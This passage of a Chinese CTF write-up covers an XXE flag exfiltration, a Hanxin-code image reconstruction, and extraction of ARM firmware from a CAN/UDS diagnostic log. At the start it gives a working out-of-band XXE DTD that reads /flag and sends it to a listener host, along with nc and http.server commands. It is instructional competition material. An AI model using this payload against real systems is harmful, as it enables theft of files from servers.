<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://frps:6010/?flag=%file;'&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>6009端口开web服务</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 6009</span><br></pre></td></tr></table></figure>

<p>6010端口开nc监听</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -L -p 6010</span><br></pre></td></tr></table></figure>

<p>上传<code>excel-crzz.xlsx</code></p>
<p>web服务收到<code>GET /file.dtd HTTP/1.1</code>请求</p>
<p>nc监听到GET包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;?flag&#x3D;flag&#123;43c57fc3-565e-42d9-ac87-5dd5087f7ed9&#125; HTTP&#x2F;1.1</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Pragma: no-cache</span><br><span class="line">User-Agent: Java&#x2F;1.8.0_252</span><br><span class="line">Host: frps:6010</span><br><span class="line">Accept: text&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, *; q&#x3D;.2, *&#x2F;*; q&#x3D;.2</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="虚幻2"><a href="#虚幻2" class="headerlink" title="虚幻2"></a>虚幻2</h3><p>18年的网鼎杯有一题<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjYxNA==">虚幻<i class="fa fa-external-link-alt"></i></span>，是关于<span class="exturl" data-url="aHR0cDovL3d3dy5kb2M4OC5jb20vcC0xOTAxOTI2NTQ4MTIyLmh0bWw=">汉信码<i class="fa fa-external-link-alt"></i></span>的</p>
<p>猜测今年也是汉信码</p>
<img src="https://i.loli.net/2020/05/27/p7sqYdTHz4XENuV.png" alt="file.png" style="zoom:200%;" />

<p>可以看出图像像是汉信码压扁了的样子，编写脚本将其展开查看</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">im = Image.open(<span class="string">"file.png"</span>)</span><br><span class="line">arr = im.load()</span><br><span class="line">(x, y) = im.size</span><br><span class="line">print(x, y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span><span class="params">(input)</span>:</span></span><br><span class="line">    black = Image.new(<span class="string">"RGB"</span>, (<span class="number">10</span>, <span class="number">10</span>), <span class="string">"black"</span>)</span><br><span class="line">    out = Image.new(<span class="string">"RGB"</span>, (<span class="number">360</span>, <span class="number">360</span>), <span class="string">"white"</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">36</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">36</span>):</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">not</span> input[x][y]):</span><br><span class="line">                out.paste(black, (x * <span class="number">10</span>, y * <span class="number">10</span>))</span><br><span class="line">    out.save(<span class="string">"generate.png"</span>)</span><br><span class="line"></span><br><span class="line">ar = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(x):</span><br><span class="line">    ar.append([])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(y):</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> arr[i, j][s] == <span class="number">255</span>:</span><br><span class="line">                ar[i].append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ar[i].append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">gen(ar)</span><br></pre></td></tr></table></figure>

<p>查看展开后的汉信码，按照格式将角码翻转得到</p>
<p><img src="https://i.loli.net/2020/05/27/r81S7lWVh9Yf4IE.png" alt="generate.png"></p>
<p>现在有两种可能性：<code>上下颠倒</code>和<code>逆时针旋转</code>。</p>
<p>还有缺的那一块的问题，因为这种汉信码带纠错区，尝试随便涂一涂看能不能纠错，最后以下图形可以<span class="exturl" data-url="aHR0cDovL3d3dy5lZml0dGVjaC5jb20vaHhkZWMuaHRtbA==">识别<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://i.loli.net/2020/05/27/vgKcr96CTejnLYZ.png" alt="Snipaste_2020-05-12_22-53-52.png"></p>
<blockquote>
<p>之前能扫出来，现在那个网站已经不堪重负挂了，不知道还有没有别的方法扫</p>
</blockquote>
<p>正常扫出来是<code>flag{eed70c7d-e530-49ba-ad45-80fdb7872e0a}</code></p>
<h3 id="Teslaaaaa"><a href="#Teslaaaaa" class="headerlink" title="Teslaaaaa"></a>Teslaaaaa</h3><p>参考链接：</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNTk0NzIuaHRt">https://bbs.pediy.com/thread-259472.htm<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JyZWV6ZV9DQVQvYXJ0aWNsZS9kZXRhaWxzLzEwNjE1NjU2Nw==">https://blog.csdn.net/Breeze_CAT/article/details/106156567<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>Hint <a href="https://wenku.baidu.com/view/dd8105d46429647d27284b73f242336c1eb930b8.html" target="_blank" rel="noopener"><code>ISO 15765-2</code></a> <a href="https://blog.csdn.net/qfmzhu/article/details/105716337" target="_blank" rel="noopener"><code>ISO 14229-1</code></a></p>
<p>解压得到<code>ecu_can_log.asc</code></p>
<p>进行简单的信息检索得知是can汽车协议</p>
<figure class="highlight asc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">date Thu Apr <span class="number">2</span> <span class="number">10</span>:<span class="number">37</span>:<span class="number">15.950</span> am <span class="number">2020</span></span><br><span class="line">base hex  timestamps absolute</span><br><span class="line"><span class="built_in">int</span>ernal events logged</span><br><span class="line"><span class="comment">// version 8.2.1</span></span><br><span class="line">   <span class="number">0.005921</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">   <span class="number">1.005921</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">   <span class="number">2.005922</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">   <span class="number">3.005922</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">   <span class="number">4.000621</span> <span class="number">1</span>  <span class="number">7</span>DF             Tx   d <span class="number">8</span> <span class="number">02</span> <span class="number">3</span>E <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  Length = <span class="number">0</span> BitCount = <span class="number">124</span> ID = <span class="number">2015</span>  <span class="comment">// 1  OTP(01) Atom 7DF-&gt;7DF : SF Length:   02         [ 3E 80 ]</span></span><br><span class="line">   <span class="number">4.005922</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">   <span class="number">5.005922</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">   <span class="number">6.005923</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">   <span class="number">7.005923</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">   <span class="number">8.000537</span> <span class="number">1</span>  <span class="number">7</span>DF             Tx   d <span class="number">8</span> <span class="number">02</span> <span class="number">3</span>E <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  Length = <span class="number">0</span> BitCount = <span class="number">124</span> ID = <span class="number">2015</span>  <span class="comment">// 1  OTP(02) Atom 7DF-&gt;7DF : SF Length:   02         [ 3E 80 ]</span></span><br><span class="line">   <span class="number">8.005923</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">   <span class="number">9.005924</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">   <span class="number">9.498709</span> <span class="number">1</span>  <span class="number">7</span>DF             Tx   d <span class="number">8</span> <span class="number">02</span> <span class="number">10</span> <span class="number">02</span> AA AA AA AA AA  Length = <span class="number">0</span> BitCount = <span class="number">116</span> ID = <span class="number">2015</span>  <span class="comment">// 1  OTP(03) Atom 7DF-&gt;7DF : SF Length:   02         [ 10 02 ]</span></span><br><span class="line">   <span class="number">9.499693</span> <span class="number">1</span>  <span class="number">7</span>B0             Rx   d <span class="number">8</span> <span class="number">06</span> <span class="number">50</span> <span class="number">02</span> <span class="number">00</span> <span class="number">32</span> <span class="number">01</span> F4 <span class="number">00</span>  Length = <span class="number">235910</span> BitCount = <span class="number">122</span> ID = <span class="number">1968</span></span><br><span class="line">   <span class="number">9.740585</span> <span class="number">1</span>  <span class="number">730</span>             Tx   d <span class="number">8</span> <span class="number">02</span> <span class="number">27</span> <span class="number">05</span> AA AA AA AA AA  Length = <span class="number">222015</span> BitCount = <span class="number">114</span> ID = <span class="number">1840</span></span><br><span class="line">   ......</span><br><span class="line">  <span class="number">10.323695</span> <span class="number">1</span>  <span class="number">7</span>B0             Rx   d <span class="number">8</span> <span class="number">05</span> <span class="number">71</span> <span class="number">01</span> FF <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  Length = <span class="number">233910</span> BitCount = <span class="number">121</span> ID = <span class="number">1968</span></span><br><span class="line">  <span class="number">10.325697</span> <span class="number">1</span>  <span class="number">7</span>DF             Tx   d <span class="number">8</span> <span class="number">02</span> <span class="number">11</span> <span class="number">01</span> AA AA AA AA AA  Length = <span class="number">0</span> BitCount = <span class="number">115</span> ID = <span class="number">2015</span>  <span class="comment">// 1  OTP(04) Atom 7DF-&gt;7DF : SF Length:   02         [ 11 01 ]</span></span><br><span class="line">  <span class="number">10.326689</span> <span class="number">1</span>  <span class="number">7</span>B0             Rx   d <span class="number">8</span> <span class="number">03</span> <span class="number">7</span>F <span class="number">11</span> <span class="number">78</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  Length = <span class="number">233910</span> BitCount = <span class="number">121</span> ID = <span class="number">1968</span></span><br><span class="line">  <span class="number">11.005924</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">  <span class="number">11.326752</span> <span class="number">1</span>  <span class="number">7</span>B0             Rx   d <span class="number">8</span> <span class="number">02</span> <span class="number">51</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  Length = <span class="number">235910</span> BitCount = <span class="number">122</span> ID = <span class="number">1968</span></span><br><span class="line">  <span class="number">12.000742</span> <span class="number">1</span>  <span class="number">7</span>DF             Tx   d <span class="number">8</span> <span class="number">02</span> <span class="number">3</span>E <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  Length = <span class="number">0</span> BitCount = <span class="number">124</span> ID = <span class="number">2015</span>  <span class="comment">// 1  OTP(05) Atom 7DF-&gt;7DF : SF Length:   02         [ 3E 80 ]</span></span><br><span class="line">  <span class="number">12.005925</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">  <span class="number">13.005925</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">  <span class="number">14.005925</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">  <span class="number">15.005926</span> CAN <span class="number">1</span> Status:chip status error active</span><br><span class="line">  <span class="number">16.000532</span> <span class="number">1</span>  <span class="number">7</span>DF             Tx   d <span class="number">8</span> <span class="number">02</span> <span class="number">3</span>E <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  Length = <span class="number">0</span> BitCount = <span class="number">124</span> ID = <span class="number">2015</span>  <span class="comment">// 1  OTP(06) Atom 7DF-&gt;7DF : SF Length:   02         [ 3E 80 ]</span></span><br><span class="line">  <span class="number">16.005926</span> CAN <span class="number">1</span> Status:chip status error active</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/27/bBOJLIitA2WF5DG.png" alt="463990_GFK2CVP2Z4FK66X.jpg"></p>
<p>图片提示是ARM芯片</p>
<p>从<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poeW9uZ3F1YW4vYXJ0aWNsZS9kZXRhaWxzLzgwMjEyMTgw">这篇博客<i class="fa fa-external-link-alt"></i></span>可以得知从左到右依次是：时间戳、CAN通道编号、帧ID（16进制）、帧方向（发送或接收）、d。之后跟的DLC、数据。</p>
<p>我们只需要帧方向和数据，所以使用正则<code>[RT]x {3}d 8[ 0-9A-F]{24}</code>提取出所有帧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Tx   d 8 02 3E 80 00 00 00 00 00</span><br><span class="line">Tx   d 8 02 3E 80 00 00 00 00 00</span><br><span class="line">Tx   d 8 02 10 02 AA AA AA AA AA</span><br><span class="line">Rx   d 8 06 50 02 00 32 01 F4 00</span><br><span class="line">Tx   d 8 02 27 05 AA AA AA AA AA</span><br><span class="line">Rx   d 8 06 67 05 11 22 33 44 00</span><br><span class="line">Tx   d 8 06 27 06 EE DD CC BB AA</span><br><span class="line">Rx   d 8 02 67 06 00 00 00 00 00</span><br><span class="line">Tx   d 8 10 0D 31 01 FF 00 44 08</span><br><span class="line">Rx   d 8 30 08 00 00 00 00 00 00</span><br><span class="line">Tx   d 8 21 00 00 00 00 00 20 00</span><br><span class="line">Rx   d 8 05 71 01 FF 00 00 00 00</span><br><span class="line">Tx   d 8 10 0B 34 00 44 08 00 00</span><br><span class="line">Rx   d 8 30 08 00 00 00 00 00 00</span><br><span class="line">Tx   d 8 21 00 00 00 20 00 AA AA</span><br><span class="line">Rx   d 8 04 74 20 01 02 00 00 00</span><br><span class="line">Tx   d 8 10 82 36 01 28 04 00 20</span><br><span class="line">Rx   d 8 30 08 00 00 00 00 00 00</span><br><span class="line">Tx   d 8 21 45 01 00 08 21 03 00</span><br><span class="line">Tx   d 8 22 08 23 03 00 08 27 03</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p><code>ISO 15765-2</code>是UDS网络传输层协议</p>
<p><img src="https://i.loli.net/2020/05/27/zYSyuLPtlsdc59p.png" alt="image.png"></p>
<p>如<code>Tx   d 8 02 3E 80 00 00 00 00 00</code></p>
<p>字节1为02，代表单帧(0)、数据长度2(2)，即<code>3E 80</code>就是协议的数据</p>
<p>协议中不存在字节为<code>31</code> <code>32</code>的情况，基本都是单帧和连续帧，所以我们可以忽略掉流控</p>
<p><code>ISO 14229-1</code>是UDS统一诊断服务</p>
<p><img src="https://img-blog.csdnimg.cn/2020042320333967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FmbXpodQ==,size_16,color_FFFFFF,t_70" alt=""></p>
<blockquote>
<p>发送方发送：<code>SID</code> + <code>数据</code></p>
<p>接收方回复：</p>
<ul>
<li>肯定：<code>SID+40</code> + <code>数据</code></li>
<li>否定：<code>7F</code> + <code>SID</code> + <code>NRC</code></li>
</ul>
</blockquote>
<p>如这两行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Tx   d 8 02 10 02 AA AA AA AA AA</span><br><span class="line">Rx   d 8 06 50 02 00 32 01 F4 00</span><br></pre></td></tr></table></figure>

<p>发送方发送<code>10 02</code>，<code>SID</code>=<code>10</code>代表诊断会话控制服务(DiagnosticSessionControl)，<code>02</code>是协议的数据</p>
<p>接收方回复<code>50 02 00 32 01 F4</code>，这里<code>SID+40</code>==<code>50</code>，表示肯定，后面<code>02 00 32 01 F4</code>是数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Tx   d 8 02 10 02 AA AA AA AA AA  10服务 诊断会话控制</span><br><span class="line">Rx   d 8 06 50 02 00 32 01 F4 00  请求成功</span><br><span class="line">Tx   d 8 02 27 05 AA AA AA AA AA  27服务 安全访问-5</span><br><span class="line">Rx   d 8 06 67 05 11 22 33 44 00  请求成功，返回秘钥</span><br><span class="line">Tx   d 8 06 27 06 EE DD CC BB AA  27服务 安全访问-6，计算秘钥返回结果</span><br><span class="line">Rx   d 8 02 67 06 00 00 00 00 00  结果校验无误，通过安全校验</span><br><span class="line">Tx   d 8 10 0D 31 01 FF 00 44 08  31服务 例行程序控制，擦除数据0x8000000</span><br><span class="line">Rx   d 8 30 08 00 00 00 00 00 00  继续发送</span><br><span class="line">Tx   d 8 21 00 00 00 00 00 20 00  31服务 例行程序控制接上文，擦除数据0x8000000</span><br><span class="line">Rx   d 8 05 71 01 FF 00 00 00 00  擦除成功</span><br><span class="line">Tx   d 8 10 0B 34 00 44 08 00 00  34服务 请求下载，下载到0x8000000</span><br><span class="line">Rx   d 8 30 08 00 00 00 00 00 00  继续发送</span><br><span class="line">Tx   d 8 21 00 00 00 20 00 AA AA  34服务 请求下载接上文，下载到0x8000000</span><br><span class="line">Rx   d 8 04 74 20 01 02 00 00 00  成功，接受下载请求</span><br><span class="line">Tx   d 8 10 82 36 01 28 04 00 20  36服务 开启数据传输，长度0x82，第一次传输</span><br><span class="line">Rx   d 8 30 08 00 00 00 00 00 00  继续发送</span><br><span class="line">Tx   d 8 21 45 01 00 08 21 03 00  接下来是持续发送数据直到发送结束（编号21-2f之后从21重新开始）</span><br><span class="line">Tx   d 8 22 08 23 03 00 08 27 03</span><br><span class="line">Tx   d 8 23 00 08 2B 03 00 08 2F</span><br><span class="line">        ···    ···    ···    ···</span><br><span class="line">Tx   d 8 22 08 5F 01 00 08 AA AA  第一次数据传输结束</span><br><span class="line">Rx   d 8 03 7F 36 78 00 00 00 00  阻塞</span><br><span class="line">Rx   d 8 02 76 01 00 00 00 00 00  成功</span><br><span class="line">Tx   d 8 10 82 36 02 5F 01 00 08  第二次数据传输开始，长度还是0x82,下面相同</span><br><span class="line">Rx   d 8 30 08 00 00 00 00 00 00  继续发送</span><br><span class="line">Tx   d 8 21 5F 01 00 08 5F 01 00 </span><br><span class="line">        ···  一共传输了0x40次  ···</span><br><span class="line">Rx   d 8 02 76 40 00 00 00 00 00  最后一次传输成功</span><br><span class="line">Tx   d 8 02 37 01 AA AA AA AA AA  37服务 传输结束</span><br><span class="line">Rx   d 8 06 77 01 C6 B6 5E 10 00  传输结束成功</span><br><span class="line">Tx   d 8 04 31 01 DF FF AA AA AA  31服务 例行程序控制，一些操作</span><br><span class="line">Rx   d 8 03 7F 31 78 00 00 00 00  阻塞</span><br><span class="line">Rx   d 8 05 71 01 DF FF 00 00 00  成功</span><br><span class="line">Tx   d 8 04 31 01 FF 01 AA AA AA  31服务 例行程序控制，执行刚刚传输的东西</span><br><span class="line">Rx   d 8 05 71 01 FF 01 00 00 00  成功</span><br><span class="line">Tx   d 8 02 11 01 AA AA AA AA AA  11服务 ECU复位，重启ECU</span><br><span class="line">Rx   d 8 03 7F 11 78 00 00 00 00  阻塞</span><br><span class="line">Rx   d 8 02 51 01 00 00 00 00 00  成功</span><br><span class="line">Tx   d 8 02 3E 80 00 00 00 00 00  3E服务 回话保持心跳包</span><br><span class="line">Tx   d 8 02 3E 80 00 00 00 00 00  3E服务 回话保持心跳包</span><br></pre></td></tr></table></figure>

<p>大佬博客的协议分析如上</p>
<p>所以我们需要的是请求下载的东西。</p>
<p>先把数据传输的部分提出来，也就是从15行开始，到第1552行</p>
<p>再用正则<code>^Tx.+?$</code>单独将发送方的帧提出来</p>
<p>编写脚本将数据提出来保存到文件中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'TxData.dat'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    frames = f.readlines()</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">hexdata=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> frame <span class="keyword">in</span> frames:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> frame.startswith(<span class="string">'Tx   d 8 10 82 36'</span>): <span class="comment"># 开始发送帧，19帧一组</span></span><br><span class="line">        i=<span class="number">1</span></span><br><span class="line">        hexdata+=frame[<span class="number">21</span>:].strip()+<span class="string">' '</span> <span class="comment"># ^Tx   d 8 10 82 36 .. (.+?)$</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">19</span>: <span class="comment"># 最后一帧</span></span><br><span class="line">        hexdata+=frame[<span class="number">12</span>:<span class="number">26</span>].strip()+<span class="string">' '</span> <span class="comment"># ^Tx   d 8 2. (.+?) .. ..$</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hexdata+=frame[<span class="number">12</span>:].strip()+<span class="string">' '</span> <span class="comment"># ^Tx   d 8 2. (.+?)$</span></span><br><span class="line">print(hexdata)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'hexdata.dat'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(hexdata)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">bytedata=[]</span><br><span class="line"><span class="keyword">while</span>(i&lt;len(hexdata)):</span><br><span class="line">    bytedata.append(int(hexdata[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">    i+=<span class="number">3</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'bytedata.dat'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(bytes(bytedata))</span><br></pre></td></tr></table></figure>

<p>直接打开文件看的话会发现一个<code>flag{canoecr7-zd9h-1emi-or8m-f8vm2od81nfk}</code></p>
<p>但是这不是真正的flag</p>
<p>根据图片提示的ARM，将其导入IDA，使用<code>ARM Little-endian</code>，开始地址<code>0x8000000</code>大小为<code>0x2000</code>，Thumb=0x1</p>
<p>得到flag相关函数的伪代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_8000168</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [sp+4h] [bp-34h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  sub_800120C(&amp;v3, <span class="string">"flag&#123;canoecr7-zd9h-1emi-or8m-f8vm2od81nfk&#125;"</span>, <span class="number">44</span>);</span><br><span class="line">  sub_8001256(v1, &amp;v3);</span><br><span class="line">  v1 += <span class="number">5</span>; <span class="comment">// 去掉了 flag&#123;</span></span><br><span class="line">  v1[<span class="number">2</span>] -= <span class="number">13</span>;</span><br><span class="line">  v1[<span class="number">11</span>] -= <span class="number">5</span>;</span><br><span class="line">  v1[<span class="number">15</span>] -= <span class="number">44</span>;</span><br><span class="line">  v1[<span class="number">3</span>] -= <span class="number">11</span>;</span><br><span class="line">  v1[<span class="number">5</span>] -= <span class="number">48</span>;</span><br><span class="line">  v1[<span class="number">7</span>] += <span class="number">43</span>;</span><br><span class="line">  v1[<span class="number">28</span>] += <span class="number">50</span>;</span><br><span class="line">  v1[<span class="number">31</span>] += <span class="number">46</span>;</span><br><span class="line">  v1[<span class="number">19</span>] -= <span class="number">13</span>;</span><br><span class="line">  v1[<span class="number">20</span>] -= <span class="number">66</span>;</span><br><span class="line">  v1[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">  v1[<span class="number">29</span>] -= <span class="number">55</span>;</span><br><span class="line">  v1[<span class="number">24</span>] -= <span class="number">51</span>;</span><br><span class="line">  v1[<span class="number">9</span>] -= <span class="number">23</span>;</span><br><span class="line">  v1[<span class="number">25</span>] -= <span class="number">6</span>;</span><br><span class="line">  v1[<span class="number">27</span>] -= <span class="number">60</span>;</span><br><span class="line">  v1[<span class="number">4</span>] -= <span class="number">52</span>;</span><br><span class="line">  v1[<span class="number">6</span>] -= <span class="number">14</span>;</span><br><span class="line">  v1[<span class="number">30</span>] -= <span class="number">52</span>;</span><br><span class="line">  v1[<span class="number">22</span>] -= <span class="number">58</span>;</span><br><span class="line">  v1[<span class="number">12</span>] -= <span class="number">48</span>;</span><br><span class="line">  v1[<span class="number">16</span>] -= <span class="number">56</span>;</span><br><span class="line">  v1[<span class="number">34</span>] -= <span class="number">53</span>;</span><br><span class="line">  *v1 -= <span class="number">48</span>;</span><br><span class="line">  v1[<span class="number">14</span>] += <span class="number">3</span>;</span><br><span class="line">  v1[<span class="number">17</span>] -= 